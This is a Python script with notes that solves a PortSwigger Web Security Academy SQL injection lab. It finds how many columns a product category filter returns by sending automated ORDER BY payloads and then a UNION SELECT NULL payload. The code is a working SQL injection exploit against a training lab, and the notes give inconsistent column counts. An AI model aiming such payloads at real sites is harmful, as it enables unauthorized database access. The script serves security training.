'''
Notes: 

Link: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

1. Vulnerability:  Product Category FIlter (SQLi)

2. Goal: 1. Determine the No. of Columns (Final Goal)

3 Analysis: WAY No 1. Find The Number of Columns # Union Command (' UNION SELECT NULL--)
                - 2 columns (' UNION SELECT NULL, NULL, NULL--) #(Error in ' UNION SELECT NULL, NULL, NULL, NULL--)
            WAY No 2. Find The Number of Columns # Order by Command (' ORDER BY 1-)
                - 3 columns (' ORDER BY 3--) (Error in 'ORDER BY 4--)
            

4. Exploit: ;)



Code reference: https://github.com/rkhal101/Web-Security-Academy-Series/blob/main/sql-injection/lab-03/sqli-lab-03.py

'''


import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def payload_sender(url, uri, payload):
    try:
        r = requests.get(url + uri + payload, verify=False, proxies=proxies)
    except:
        r = requests.get(url + uri + payload, verify=False)
    return r.text

def exploit_sqli(url):
    uri = '/filter?category=Pets'
    print("-"*40+"\n[*] Way 2: Using Order BY Command")
    count=1
    while True: 
        payload_orderby="' ORDER BY %s--"%count
        r=payload_sender(url, uri, payload_orderby)
        print("Tried the count value -> %s"%count)
        print("Way 2: Payload -> %s"%payload_orderby)

        if "Internal Server Error" in r:
            print("-"*40+"\n[*] Way 1: Using Union Command\nAutomatically Solving the Lab :)")
            null_count="NULL, "*(count-1)
            payload_union="' UNION SELECT %s--"%null_count[:-2]
            print("Way 1: Payload -> %s"%payload_union)
            payload_sender(url, uri, payload_union)
            return count-1
        else:
            count+=1

if __name__ == "__main__":
    try:
        url = sys.argv[1]
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        
        # Opional filling Manually
        url = 'https://0af800fc04253ac682f1f75800f30075.web-security-academy.net'  #Update Domain here

    num_col= exploit_sqli(url)

    if num_col:
        print("[+] The Number of column(s) are "+str(num_col)+"")
    else:
        print("[-] SQL injection was not unsuccessful!")
